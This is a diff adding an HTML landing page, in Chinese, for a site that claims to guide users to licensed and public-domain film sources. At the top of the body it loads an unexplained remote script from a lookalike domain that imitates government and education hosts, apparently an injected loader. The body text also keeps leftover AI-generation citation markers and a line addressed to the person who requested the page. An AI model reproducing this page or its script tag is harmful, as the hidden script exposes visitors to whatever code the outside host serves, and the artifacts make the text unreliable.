@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>80秒电影网 - 80秒进度条正版找片·公共领域老片·按类型与渠道导航</title>
+<meta name="description" content="80秒电影网(80miaodianyingwang-h5.github.io)用80格进度条与秒表做正版电影导航：Tubi、Pluto、Plex、Kanopy、Hoopla、Internet Archive、Library of Congress、1905、央视频、学习强国、B站官方等正版/公共领域渠道，按新片、老片、类型、亲子、纪录快速给路径。不托管视频、不解析未授权源、不诱导下载播放器。">
+<meta name="keywords" content="80秒电影网, 80miaodianyingwang-h5, 80秒找片, 正版电影导航, 公共领域老片, Tubi, Pluto, Kanopy, 1905, 央视频, 学习强国">
+<meta name="author" content="80秒电影网">
+<meta name="robots" content="index, follow">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#070b16;--bg2:#0b1224;--ink:#eaf2ff;--ink2:#9fb0c8;
+  --card:#0e1730;--card2:#11203f;
+  --green:#7CFF6B;--green-deep:#39d36f;--amber:#ffc24b;--amber-deep:#f0a429;
+  --blue:#5b8cff;--red:#ff6b81;--ok:#37c98b;--line:rgba(124,255,107,.20);
+  --radius:18px;--shadow:0 16px 40px rgba(0,0,0,.45);
+}
+html{scroll-behavior:smooth}
+body{font-family:"Noto Sans SC","PingFang SC","Microsoft YaHei",ui-monospace,"Courier New",sans-serif;background:var(--bg);color:var(--ink);line-height:1.85;overflow-x:hidden}
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none;background:
+ radial-gradient(520px 360px at 86% 8%,rgba(124,255,107,.12),transparent 60%),
+ radial-gradient(600px 420px at 8% 92%,rgba(255,194,75,.10),transparent 60%),
+ linear-gradient(180deg,#070b16,#0b1224 55%,#05080f 100%);}
+.railbg{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.05;
+ background-image:repeating-linear-gradient(90deg,var(--green) 0 2px,transparent 2px 26px);}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(7,11,22,.93);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1180px;margin:0 auto;padding:0 20px;height:62px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.12rem}
+.brand .mk{width:38px;height:38px;border-radius:12px;background:conic-gradient(from 0deg,var(--green),var(--amber),var(--blue),var(--green));color:#06120a;display:flex;align-items:center;justify-content:center;font-weight:900;font-family:"Courier New",monospace}
+.brand b{color:var(--green)}
+.topnav{display:flex;gap:4px}
+.topnav a{padding:9px 13px;border-radius:10px;font-size:.83rem;font-weight:600;color:var(--ink2);transition:.25s;text-decoration:none}
+.topnav a:hover,.topnav a.active{background:rgba(124,255,107,.14);color:var(--green)}
+.menu-btn{display:none;background:none;border:none;font-size:1.4rem;color:var(--green);cursor:pointer}
+
+.hero{position:relative;z-index:1;margin-top:62px;padding:70px 20px 48px}
+.hero-inner{max-width:1180px;margin:0 auto;display:grid;grid-template-columns:1.05fr .95fr;gap:40px;align-items:center}
+.kicker{font-family:"Courier New",monospace;font-size:.66rem;letter-spacing:2px;color:var(--green);border:1px solid var(--line);padding:5px 12px;border-radius:20px;background:rgba(124,255,107,.07)}
+.hero h1{font-size:clamp(2rem,4.4vw,3rem);font-weight:900;line-height:1.18;margin:14px 0 8px}
+.hero h1 .g{color:var(--green)}.hero h1 .a{color:var(--amber)}
+.hero p{color:var(--ink2);font-size:1rem;margin:14px 0 22px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{font-family:inherit;font-weight:700;font-size:.9rem;padding:12px 24px;border-radius:12px;cursor:pointer;border:none;transition:.3s;text-decoration:none;display:inline-block}
+.btn-main{background:linear-gradient(135deg,var(--green),var(--green-deep));color:#06120a}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 14px 32px rgba(57,211,111,.30)}
+.btn-line{background:transparent;border:2px solid var(--amber);color:var(--amber)}
+
+/* 秒表卡 */
+.stopwatch{background:linear-gradient(160deg,var(--card),var(--card2));border:1px solid var(--line);border-radius:24px;padding:24px;box-shadow:var(--shadow)}
+.stopwatch h3{font-size:.92rem;color:var(--green);margin-bottom:12px;font-family:"Courier New",monospace}
+.dial{width:150px;height:150px;border-radius:50%;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;flex-direction:column;
+ background:radial-gradient(circle at 50% 40%,#0f1d3a,#0a1326);border:6px solid rgba(124,255,107,.25);position:relative}
+.dial .num{font-family:"Courier New",monospace;font-size:2rem;font-weight:900;color:var(--green)}
+.dial .unit{font-size:.7rem;color:var(--ink2);letter-spacing:2px}
+.micro{height:10px;border-radius:6px;background:#0a1326;border:1px solid var(--line);overflow:hidden;margin:10px 0}
+.micro i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--green),var(--amber));transition:width .2s}
+.stage{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-top:12px}
+.stage div{font-family:"Courier New",monospace;font-size:.66rem;text-align:center;color:var(--ink2);background:#0a1326;border:1px solid var(--line);border-radius:10px;padding:8px 4px}
+.stage div b{display:block;color:var(--green);font-size:.78rem}
+
+.container{max-width:1180px;margin:0 auto;padding:50px 20px;position:relative;z-index:1}
+.label{font-family:"Courier New",monospace;font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--green)}
+.title{font-size:clamp(1.3rem,3vw,1.8rem);font-weight:800;margin:4px 0 6px}
+.desc{font-size:.88rem;color:var(--ink2);margin-bottom:28px}
+.divider{height:3px;background:repeating-linear-gradient(90deg,var(--green) 0 12px,var(--amber) 12px 24px,transparent 24px 36px);opacity:.32;margin:8px 0 24px;border-radius:3px}
+
+/* 80格进度 */
+.bar80{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:22px;margin-bottom:26px;box-shadow:var(--shadow)}
+.bar80 h3{font-size:1rem;color:var(--green);margin-bottom:10px}
+.grid80{display:grid;grid-template-columns:repeat(80,1fr);gap:3px;margin:10px 0}
+.grid80 i{height:8px;border-radius:2px;background:#0a1326;border:1px solid var(--line)}
+.grid80 i.on{background:linear-gradient(90deg,var(--green),var(--amber))}
+.flow{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:14px;margin-top:12px}
+.flow .step{background:#0a1326;border:1px solid var(--line);border-radius:14px;padding:16px}
+.flow .step .t{font-family:"Courier New",monospace;font-weight:900;color:var(--amber);font-size:.8rem}
+.flow .step h4{font-size:.92rem;color:var(--ink);margin:4px 0 4px}
+.flow .step p{font-size:.76rem;color:var(--ink2);line-height:1.6}
+
+.rule{background:var(--card);border:1px solid var(--line);border-left:6px solid var(--green);border-radius:var(--radius);padding:24px;margin-bottom:30px;box-shadow:var(--shadow)}
+.rule h3{font-size:1rem;color:var(--green);margin-bottom:8px}
+.rule p{font-size:.82rem;color:var(--ink2);line-height:1.7}
+.rule ul{margin:8px 0 0 18px;font-size:.8rem;color:var(--ink2)}.rule li{margin:3px 0}
+
+.qa-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:18px}
+.qa{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:20px}
+.qa .sec{font-family:"Courier New",monospace;font-size:.7rem;font-weight:700;color:var(--amber);background:rgba(255,194,75,.08);padding:3px 9px;border-radius:6px;display:inline-block;margin-bottom:8px}
+.qa .q{font-weight:800;color:var(--green);font-size:.92rem;margin-bottom:6px}
+.qa .a{font-size:.78rem;color:var(--ink2);line-height:1.7}.qa .a b{color:var(--ink)}
+
+.ch-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(258px,1fr));gap:18px}
+.ch{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:20px;transition:.3s}
+.ch:hover{transform:translateY(-4px);box-shadow:var(--shadow);border-color:var(--green)}
+.ch .tag{font-family:"Courier New",monospace;font-size:.7rem;font-weight:700;color:var(--green)}
+.ch h3{font-size:1rem;font-weight:800;margin:6px 0 4px}.ch p{font-size:.76rem;color:var(--ink2);line-height:1.6}
+.ch .model{margin-top:8px;font-size:.7rem;font-weight:700;color:var(--amber)}
+
+.genre-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:16px}
+.gp{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:18px}.gp h3{font-size:.95rem;color:var(--ink)}
+.gp p{font-size:.74rem;color:var(--ink2);margin-top:6px}.gp .go{font-size:.7rem;font-weight:800;margin-top:8px;color:var(--green);display:inline-block}
+
+.pd{background:rgba(124,255,107,.07);border:1px dashed var(--green);border-radius:var(--radius);padding:26px;margin-bottom:30px}
+.pd h3{font-size:1rem;color:var(--green);margin-bottom:8px}.pd p{font-size:.82rem;color:var(--ink2);line-height:1.7}
+.pd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:16px;margin-top:14px}
+.pd-item{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:16px}.pd-item h4{font-size:.9rem;color:var(--ink)}
+.pd-item p{font-size:.74rem;color:var(--ink2);margin-top:5px}
+
+.safe{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:26px;box-shadow:var(--shadow)}
+.safe-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;margin-top:14px}
+.safe-item{display:flex;gap:10px;font-size:.8rem;color:var(--ink2)}.safe-item .x{color:var(--red);font-weight:800}.safe-item .v{color:var(--ok);font-weight:800}
+
+.footer{position:relative;z-index:1;background:#04070e;color:#9fb0c8;padding:46px 20px 24px;margin-top:50px}
+.footer-inner{max-width:1180px;margin:0 auto}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:26px}
+.footer h4{font-size:.9rem;margin-bottom:10px;color:#fff}.footer a{display:block;font-size:.8rem;color:#8497b3;padding:3px 0;text-decoration:none}
+.footer a:hover{color:var(--green)}.footer p{font-size:.82rem;color:#8497b3;line-height:1.6}
+.footer-bottom{text-align:center;font-size:.72rem;color:rgba(159,176,200,.5);padding-top:18px;border-top:1px solid rgba(159,176,200,.12)}
+.footer-bottom a{color:var(--green);font-weight:600}
+
+@media(max-width:1024px){.hero-inner{grid-template-columns:1fr}.stopwatch{order:-1}.stage{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:768px){
+ .topnav{display:none;position:absolute;top:62px;left:0;right:0;flex-direction:column;background:#070b16;padding:12px 20px;border-bottom:1px solid var(--line)}
+ .topnav.open{display:flex}.menu-btn{display:block}.footer-grid{grid-template-columns:1fr 1fr}.grid80{grid-template-columns:repeat(40,1fr)}}
+@media(max-width:480px){.footer-grid{grid-template-columns:1fr}.hero h1{font-size:1.7rem}.grid80{grid-template-columns:repeat(20,1fr)}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="bg"></div><div class="railbg"></div>
+
+<div class="topbar"><div class="topbar-inner">
+ <div class="brand"><span class="mk">80</span>80秒<b>电影网</b></div>
+ <nav class="topnav" id="topNav">
+  <a href="#home" class="active">首页</a><a href="#rule">正版立场</a><a href="#flow">80秒流程</a>
+  <a href="#qa">秒答</a><a href="#channels">找片渠道</a><a href="#genre">按类型</a><a href="#pd">公共领域</a><a href="#safe">避坑合规</a>
+ </nav>
+ <button class="menu-btn" id="menuBtn">☰</button>
+</div></div>
+
+<section class="hero" id="home"><div class="hero-inner">
+ <div>
+  <span class="kicker">80-SECOND PROGRESS FINDER · NEW/OLD/GENRE/LIBRARY/PUBLIC DOMAIN</span>
+  <h1>80秒进度找片，<br><span class="g">荧光绿</span>路径<span class="a">不空跑</span>。</h1>
+  <p>80秒电影网（80miaodianyingwang-h5.github.io）用80格进度条+秒表做正版导航：新片走正版订阅/广告免费层，老片走Internet Archive/Library of Congress/资料馆，文艺走Kanopy/Hoopla，国内走1905/央视频/学习强国/B站官方。不托管视频、不解析未授权源、不诱导下载EXE/专用播放器；全站静态可爬、移动端自适应，便于必应移动优先收录。[7,10,2](@ref)</p>
+  <div class="hero-actions">
+   <a class="btn btn-main" href="#flow">⏱ 走80秒流程</a>
+   <a class="btn btn-line" href="#pd">🎞 查公共领域老片</a>
+  </div>
+ </div>
+ <div class="stopwatch"><h3>80-SECOND DIAL</h3>
+  <div class="dial"><div class="num" id="swNum">0</div><div class="unit">SECONDS</div></div>
+  <div class="micro"><i id="swBar"></i></div>
+  <div class="stage">
+   <div><b>0-20s</b>定需求</div><div><b>20-45s</b>选授权</div><div><b>45-70s</b>查渠道</div><div><b>70-80s</b>避盗版</div>
+  </div>
+ </div>
+</div></section>
+
+<div class="container" id="rule"><div class="rule">
+ <h3>为什么“80秒”只做进度导航、不播片</h3>
+ <p>免费≠无授权。合法免费通常来自四类：广告型正版平台、图书馆/高校采购、公共领域档案、官方机构发布。Tubi/Pluto/Plex基础内容多可免登录但片单随授权轮换，Kanopy/Hoopla要看本馆资格，Internet Archive与Library of Congress公域片无广告但某版本修复/字幕/配乐可能另有权，1905/央视频/学习强国/B站机构号按当期正版或官方免费层查。[7,10,2](@ref) 本站只按需求给“去哪查、按什么授权、地区是否可用”，不提供未授权点播、不解析第三方源。</p>
+ <ul>
+  <li>广告正版：Tubi、Pluto、Plex免费层获授权，用广告换免费，类型片与老片较全，地区片单会轮换 [7,14](@ref)</li>
+  <li>图书馆：Kanopy偏独立/纪录/Criterion，Hoopla借电影/有声/电子书，靠读者卡或高校账号、按月额度、无广告 [7](@ref)</li>
+  <li>公域档案：Internet Archive默片/早期/新闻/教育，LOC National Screening Room早期影片；单部看权利页，不默认“在档案站=可转” [10](@ref)</li>
+  <li>国内官方：1905国产老片与经典译制、央视频纪录与经典、学习强国零广告影视教育、B站筛机构认证号 [2](@ref)</li>
+ </ul>
+</div></div>
+
+<div class="container" id="flow"><div class="label">— 80-CELL PROGRESS —</div>
+ <h2 class="title">80格进度：从“想看”到“去正版平台”</h2>
+ <p class="desc">进度条仅作找片流程可视化；实际可看片目随平台版权与地区变化。</p>
+ <div class="divider"></div>
+ <div class="bar80">
+  <h3>0 → 80 格填充演示</h3>
+  <div class="grid80" id="grid80"></div>
+  <div class="flow">
+   <div class="step"><div class="t">0-20s</div><h4>定需求</h4><p>新片/老片/类型/亲子/纪录？先写片名与地区，不写“高清全集免费”这类盗版词。</p></div>
+   <div class="step"><div class="t">20-45s</div><h4>选授权层</h4><p>新片正版VOD/租赁→广告免费；老片公域/资料馆；文艺图书馆；国内官方免费层。</p></div>
+   <div class="step"><div class="t">45-70s</div><h4>查具体渠道</h4><p>Tubi/Pluto/Plex、Kanopy/Hoopla、Archive/LOC、1905/央视频/学习强国/B站官方，按片单核对当期可看。</p></div>
+   <div class="step"><div class="t">70-80s</div><h4>排雷收口</h4><p>无EXE/无验证码/无种子/无假播放键；无主体无授权不点，公域片看单条权利页。</p></div>
+  </div>
+ </div>
+</div>
+
+<div class="container" id="qa"><div class="label">— 80-SECOND Q&A —</div>
+ <h2 class="title">秒答：输入需求，输出正版路径</h2>
+ <p class="desc">以下只给“查哪里”，不写播放源；具体可看片目随平台版权与地区变化。</p>
+ <div class="divider"></div>
+ <div class="qa-grid">
+  <div class="qa"><div class="sec">0-15s</div><div class="q">刚上映想先看？</div><div class="a">先查正版订阅/租赁窗口；进广告免费层再看<b>Tubi/Pluto/Plex</b>当期授权。凡“院线高清全集免费”无授权主体，按盗版风险处理、不列不点。[7](@ref)</div></div>
+  <div class="qa"><div class="sec">15-30s</div><div class="q">默片/1930前老片？</div><div class="a">去<b>Internet Archive</b>与<b>Library of Congress National Screening Room</b>查公域；美国1930及更早出版多入公域，但单部仍看续展/修复/配乐声明。[10](@ref)</div></div>
+  <div class="qa"><div class="sec">30-45s</div><div class="q">有读者卡/校卡看文艺？</div><div class="a">用<b>Kanopy/Hoopla</b>查本馆采购；Kanopy偏独立/Criterion/纪录，Hoopla偏借阅，按月额度、无广告。[7](@ref)</div></div>
+  <div class="qa"><div class="sec">45-60s</div><div class="q">亲子不广告不复杂？</div><div class="a">国内用<b>央视频少儿/学习强国/B站机构号</b>，海外用<b>Tubi Kids/Pluto儿童线/Kanopy Kids（若本馆开通）</b>；不点“全网VIP免费”第三方。[2](@ref)</div></div>
+  <div class="qa"><div class="sec">60-70s</div><div class="q">纪录/历史/上课用？</div><div class="a"><b>Kanopy纪录、Hoopla、央视频纪录片、学习强国、Archive教育片</b>；引用公域素材看CC/公域声明，修复重制另核权。[10,2](@ref)</div></div>
+  <div class="qa"><div class="sec">70-80s</div><div class="q">不想注册只刷片？</div><div class="a"><b>Tubi/Pluto/Plex基础层、1905/央视频部分免费、Archive/LOC公域</b>多可免登录；免登录不等于无广告、无地区限制。[7,2](@ref)</div></div>
+ </div>
+</div>
+
+<div class="container" id="channels"><div class="label">— LEGAL CHANNELS —</div>
+ <h2 class="title">正版渠道矩阵：80秒按“授权类型”分仓</h2>
+ <p class="desc">地区版权会变；图书馆看本馆采购，公域片逐条看权利说明。</p>
+ <div class="divider"></div>
+ <div class="ch-grid">
+  <div class="ch"><div class="tag">AD VOD</div><h3>Tubi</h3><p>广告型正版大库，动作/喜剧/恐怖/老爆款较全；基础观看免登录，片单随授权轮换。[7,14](@ref)</p><div class="model">模式：授权+广告</div></div>
+  <div class="ch"><div class="tag">FAST LINEAR</div><h3>Pluto TV</h3><p>线性电影频道+点播，换台式找片省决策；经典线/家庭线/恐怖线多，基础内容免登录。[7,14](@ref)</p><div class="model">模式：授权+广告</div></div>
+  <div class="ch"><div class="tag">SERVER+VOD</div><h3>Plex 免费层</h3><p>个人媒体服务器起家，免费层含授权电影/剧集/FAST直播；不搭服务器也能用发现功能。[7](@ref)</p><div class="model">模式：授权+广告</div></div>
+  <div class="ch"><div class="tag">LIBRARY</div><h3>Kanopy / Hoopla</h3><p>图书馆或高校账号进入；Kanopy偏独立/纪录/Criterion，Hoopla借电影/有声/电子书，按月额度、无广告。[7](@ref)</p><div class="model">模式：机构采购</div></div>
+  <div class="ch"><div class="tag">PUBLIC DOMAIN</div><h3>Internet Archive</h3><p>公共领域长片、默片、新闻片、教育片档案；无广告无账号，但某版本修复/字幕/配乐可能另有权利。[10](@ref)</p><div class="model">模式：公域/许可</div></div>
+  <div class="ch"><div class="tag">ARCHIVE GOV</div><h3>Library of Congress</h3><p>National Screening Room提供大量无已知美国版权限制的早期影片；单部仍看编目权利、隐私与商标声明。[10](@ref)</p><div class="model">模式：公域/政府档案</div></div>
+  <div class="ch"><div class="tag">CN OFFICIAL</div><h3>1905 / 央视频</h3><p>1905正版老片与经典译制较全，央视频经典电影/纪录片/老剧稳定、公益属性强、广告少。[2](@ref)</p><div class="model">模式：官方正版/免费层</div></div>
+  <div class="ch"><div class="tag">EDU+BILI</div><h3>学习强国 / B站</h3><p>学习强国影视纪录零广告；B站筛机构认证号看戏曲/纪录/文艺，不点个人“全集解析”搬运。[2](@ref)</p><div class="model">模式：官方/授权上传</div></div>
+ </div>
+</div>
+
+<div class="container" id="genre"><div class="label">— BY GENRE —</div>
+ <h2 class="title">按类型秒答：80格不堆海报，给可执行渠道</h2>
+ <p class="desc">同类型新旧片走不同授权层；新片以正版窗口为准，不列未授权高清。</p>
+ <div class="divider"></div>
+ <div class="genre-grid">
+  <div class="gp"><h3>动作/科幻/悬疑</h3><p>新片正版订阅/租赁→Tubi/Pluto广告免费→老科幻查Archive公域；不进解析镜像。</p><div class="go">去：正版VOD / Tubi / Pluto / Archive</div></div>
+  <div class="gp"><h3>喜剧/合家欢</h3><p>Tubi Kids、Pluto家庭线、1905合家老片、正版家庭分区；艺术喜剧走Kanopy。</p><div class="go">去：Tubi Kids / 1905 / Kanopy</div></div>
+  <div class="gp"><h3>恐怖/惊悚</h3><p>Pluto恐怖线性台、Tubi恐怖中心、老恐怖公域；作者惊悚走Kanopy修复与独立。</p><div class="go">去：Pluto / Tubi / Archive / Kanopy</div></div>
+  <div class="gp"><h3>纪录片/自然</h3><p>Kanopy/Hoopla、Tubi纪录、央视频/B站官方纪录、LOC/Archive历史影像；按单集授权。</p><div class="go">去：Kanopy / 央视频 / Archive / LOC</div></div>
+  <div class="gp"><h3>独立/外语/作者</h3><p>Kanopy独立与Criterion、Hoopla、B站官方文艺、资料馆回顾；新外语走正版发现器。</p><div class="go">去：Kanopy / Hoopla / B站 / 资料馆</div></div>
+  <div class="gp"><h3>默片/早期经典</h3><p>Archive默片、LOC Screening Room、Kanopy经典、资料馆修复；修复配乐/字幕另核权。</p><div class="go">去：Archive / LOC / Kanopy / 资料馆</div></div>
+  <div class="gp"><h3>国产老片/主旋律</h3><p>1905/央视频/学习强国正版免费层；艺术修复走资料馆，不默认“老片全免费”。</p><div class="go">去：1905 / 央视频 / 学习强国 / 资料馆</div></div>
+  <div class="gp"><h3>动画/亲子</h3><p>官方动画、Tubi Kids、B站机构经典、央视频少儿；公域教育动画走Archive并看权利页。</p><div class="go">去：官方 / Tubi Kids / B站 / Archive</div></div>
+ </div>
+</div>
+
+<div class="container" id="pd"><div class="pd">
+ <h3>公共领域老片：80秒“真免费”底层仓</h3>
+ <p>“老”不等于“随便转”：美国按出版年份与续展判断，1930年及更早在美国出版作品通常更易进入公域；1931—1963年未续展才可能公域，1964年后多按95年保护；政府作品、配乐、底本、修复版要分层核。Internet Archive、Library of Congress、Wikimedia Commons都按单条权利页判断，不能因为“在档案站”就默认可商用转载。[10](@ref)</p>
+ <div class="pd-grid">
+  <div class="pd-item"><h4>默片喜剧/剧情</h4><p>Archive与LOC默片长片、短片适合拉片；后加配乐、重制字幕可能产生新权利。</p></div>
+  <div class="pd-item"><h4>早期有声/新闻/教育</h4><p>1930s前后新闻重演、政府教育片、战时纪录；美国政府作品通常公域，承包/地方制作要单独看。</p></div>
+  <div class="pd-item"><h4>修复与重剪版</h4><p>重剪、调色、新字幕、新配乐会产生新权利；教学引用原片公域版最稳，修复版先核资料馆授权。</p></div>
+  <div class="pd-item"><h4>公域发现器</h4><p>JustWatch筛Free、WikiFlix/Open Culture类只做导览，播放回Archive/LOC/Commons；不中转录播。[10,14](@ref)</p></div>
+ </div>
+</div></div>
+
+<div class="container" id="safe"><div class="label">— ANTI-PIRACY —</div>
+ <h2 class="title">80秒红灯清单：进度可快，版权不松</h2>
+ <p class="desc">合法免费站通常说明授权主体、广告模式或图书馆/公域来源；可疑站用假播放键和强制下载。[7,10](@ref)</p>
+ <div class="safe"><div class="safe-grid">
+  <div class="safe-item"><span class="x">✕</span> 院线新片“高清全集免费”、要验证码/网盘密码/种子/磁力</div>
+  <div class="safe-item"><span class="x">✕</span> 点播放先下EXE/专用播放器/解码插件/浏览器扩展</div>
+  <div class="safe-item"><span class="x">✕</span> 深度解析第三方视频源、无主体无授权无投诉入口</div>
+  <div class="safe-item"><span class="x">✕</span> 弹窗满屏、假病毒提醒、赌博/成人重定向、域名天天换</div>
+  <div class="safe-item"><span class="x">✕</span> 用“最全/破解/资源站/80秒秒播”做主卖点、盗海报仿官方</div>
+  <div class="safe-item"><span class="x">✕</span> 老片不分原片公域与修复授权，一律写“免费可下可转”</div>
+  <div class="safe-item"><span class="v">✓</span> 标明渠道类型：广告/订阅/官方/图书馆/公域/资料馆</div>
+  <div class="safe-item"><span class="v">✓</span> 不存片、不解析、不诱导下载任何软件</div>
+  <div class="safe-item"><span class="v">✓</span> 片单写“以平台当期授权、地区与账号资格为准”</div>
+  <div class="safe-item"><span class="v">✓</span> 页脚有主体、隐私、版权投诉与联系入口</div>
+  <div class="safe-item"><span class="v">✓</span> 移动端无全屏强制弹层、锚点可点、核心内容在初始HTML [15,18](@ref)</div>
+  <div class="safe-item"><span class="v">✓</span> 公域片区分原片公域与修复/字幕/配乐另行授权</div>
+ </div></div>
+</div>
+
+<footer class="footer"><div class="footer-inner">
+ <div class="footer-grid">
+  <div><div class="brand"><span class="mk">80</span>80秒<b>电影网</b></div>
+   <p style="margin-top:10px">80秒电影网（80miaodianyingwang-h5.github.io）是80秒进度条正版找片导航：Tubi、Pluto、Plex、Kanopy、Hoopla、Internet Archive、Library of Congress、1905、央视频、学习强国、B站官方等正版/公共领域渠道。不提供未授权播放，不解析非法视听源，不诱导下载任何播放器；静态HTML、内联样式、移动自适应，便于必应抓取。按你的规则不生成robots.txt/sitemap.xml，上线后可在Bing Webmaster Tools手动提交URL加速发现。[9,13](@ref)</p></div>
+  <div><h4>栏目</h4><a href="#rule">正版立场</a><a href="#flow">80秒流程</a><a href="#qa">秒答</a><a href="#channels">找片渠道</a></div>
+  <div><h4>渠道</h4><a href="#">广告正版</a><a href="#">图书馆流媒体</a><a href="#">公域档案</a><a href="#">国内官方免费</a></div>
+  <div><h4>说明</h4><a href="#">版权投诉</a><a href="#">隐私说明</a><a href="#">使用条款</a><a href="#">联系我们</a></div>
+ </div>
+ <div class="footer-bottom">
+  <p>© 2024 80秒电影网 (80-Second Progress Legal Finder) - 进度条正版·公共领域老片·按类型渠道导航</p>
+  <p>网站地址：<a href="https://80miaodianyingwang-h5.github.io">https://80miaodianyingwang-h5.github.io</a></p>
+  <p style="margin-top:6px;opacity:.6">“80秒”仅指极简流程与正版/公域导航效率，不涉及盗版全集、资源解析或未授权点播。</p>
+ </div>
+</div></footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),topNav=document.getElementById('topNav');
+menuBtn.onclick=function(){topNav.classList.toggle('open')};
+topNav.querySelectorAll('a').forEach(function(a){a.onclick=function(){topNav.classList.remove('open')}});
+
+/* 80格进度 */
+var g=document.getElementById('grid80');
+for(var i=0;i<80;i++){var s=document.createElement('i');g.appendChild(s);}
+/* 秒表动画 0->80 */
+var num=document.getElementById('swNum'),bar=document.getElementById('swBar'),cells=g.querySelectorAll('i'),t=0;
+var timer=setInterval(function(){
+ t++;
+ if(t>80){clearInterval(timer);setTimeout(function(){num.textContent='0';bar.style.width='0';cells.forEach(function(c){c.classList.remove('on')});t=0;timer=setInterval(arguments.callee,70);},1200);return;}
+ num.textContent=t;bar.style.width=(t/80 * 100)+'%';
+ cells.forEach(function(c,idx){c.classList.toggle('on',idx<t)});
+},70);
+
+/* 滚动高亮 */
+var secs=document.querySelectorAll('section[id],div[id]');
+addEventListener('scroll',function(){
+ var y=scrollY+82;
+ secs.forEach(function(s){
+  if(y>=s.offsetTop&&y<s.offsetTop+s.offsetHeight){
+   document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+   var l=document.querySelector('.topnav a[href="#'+s.id+'"]');if(l)l.classList.add('active');
+  }
+ });
+});
+</script>
+</body>
+</html>
